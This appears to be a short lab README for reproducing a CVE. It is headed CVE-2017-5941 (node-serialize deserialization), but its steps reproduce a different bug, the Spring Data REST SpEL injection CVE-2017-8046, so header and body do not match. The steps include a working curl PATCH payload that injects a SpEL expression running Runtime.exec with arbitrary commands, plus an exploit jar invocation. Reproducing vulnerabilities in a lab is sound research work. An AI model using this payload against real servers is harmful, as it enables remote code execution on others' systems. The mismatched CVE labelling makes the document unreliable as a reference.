## CVE-2017-5941
https://nvd.nist.gov/vuln/detail/CVE-2017-5941#range-6741888 \
Target Application: Node \
Software Link: https://www.npmjs.com/package/node-serialize \
Version: 0.0.4 \
Writeup: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ \
Used PoCs: 
* https://packetstormsecurity.com/files/161356/Node.JS-Remote-Code-Execution.html
* https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### Steps to Reproduce

1- To Create server jar in SpringBreakVulnerableApp run `mvn clean install spring-boot:repackage` \
2- Run server `mvn spring-boot:run` \
3- To start server in SpringBreakVulnerableApp run `java -jar -Dserver.port=8090 target/SpringBreakVulnerableApp-1.0.jar --debug` \
4- Create data for exploit `curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://localhost:8090/entity` \
5- To Create exploit jar, in spring-break_cve-2017-8046 run `mvn clean compile package` \
6- To execute commands use ` java -jar spring-break_cve-2017-8046-1.3-jar-with-dependencies.jar --url "http://localhost:8090/entity/1" --command "<command>"` or `curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"<command>\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://localhost:8090/entity/1/"`